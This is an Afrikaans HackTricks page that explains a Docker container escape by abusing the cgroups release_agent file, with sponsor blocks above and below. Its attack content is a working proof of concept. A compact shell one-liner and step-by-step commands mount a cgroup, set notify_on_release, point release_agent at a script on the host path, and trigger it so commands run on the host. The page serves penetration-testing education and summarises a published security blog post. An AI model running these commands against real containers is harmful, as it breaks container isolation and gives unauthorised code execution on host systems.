# Docker release\_agent cgroups ontsnapping

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) is 'n **dark-web** aangedrewe soekenjin wat **gratis** funksies bied om te kontroleer of 'n maatskappy of sy kliënte **gekompromitteer** is deur **steelmalware**.

Hul primêre doel van WhiteIntel is om rekening-oorneem en lospryse-aanvalle te bekamp wat voortspruit uit inligtingsteelmalware.

Jy kan hul webwerf besoek en hul enjin vir **gratis** probeer by:

{% embed url="https://whiteintel.io" %}

---

**Vir verdere besonderhede, verwys na die [oorspronklike blogpos](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/).** Dit is net 'n opsomming:

Oorspronklike PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
Die bewys van konsep (PoC) demonstreer 'n metode om cgroups te misbruik deur 'n `release_agent` lêer te skep en sy aanroeping te trigger om willekeurige bevele op die houer-gashuis uit te voer. Hier is 'n uiteensetting van die stappe wat betrokke is:

1. **Berei die Omgewing Voor:**
- 'n Gids `/tmp/cgrp` word geskep om as 'n koppelvlak vir die cgroup te dien.
- Die RDMA cgroup-beheerder word aan hierdie gids gekoppel. In geval van afwesigheid van die RDMA-beheerder, word dit voorgestel om die `memory` cgroup-beheerder as 'n alternatief te gebruik.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Stel die Kind Cgroup op:**
   - 'n Kind cgroup genaamd "x" word geskep binne die gemonteerde cgroup gids.
   - Kennisgewings word geaktiveer vir die "x" cgroup deur 1 na sy notify_on_release lêer te skryf.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Stel die Vrystellingsagent in:**
- Die pad van die houer op die gasheer word verkry uit die /etc/mtab-lêer.
- Die release_agent-lêer van die cgroup word dan ingestel om 'n skrip genaamd /cmd uit te voer wat op die verkrygte gasheerpad geleë is.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Skep en Konfigureer die /cmd Skrip:**
- Die /cmd skrip word binne die houer geskep en ingestel om ps aux uit te voer, waar die uitset na 'n lêer genaamd /output in die houer omgelei word. Die volledige pad van /output op die gasheer word gespesifiseer.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Lokaliseer die Aanval:**
- 'n Proses word geïnisieer binne die "x" kind cgroup en word dadelik beëindig.
- Dit lok die `release_agent` (die /cmd-skrip) uit, wat ps aux op die gasheer uitvoer en die uitset na /uitset binne die houer skryf.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) is 'n **dark-web** aangedrewe soekenjin wat **gratis** funksies bied om te kontroleer of 'n maatskappy of sy kliënte deur **steelmalware** **gekompromiteer** is.

Hul primêre doel van WhiteIntel is om rekening-oorneemings en lospryse-aanvalle te beveg wat voortspruit uit inligtingsteelmalware.

Jy kan hul webwerf besoek en hul enjin vir **gratis** probeer by:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**SUBSKRIPSIEPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag. 

</details>
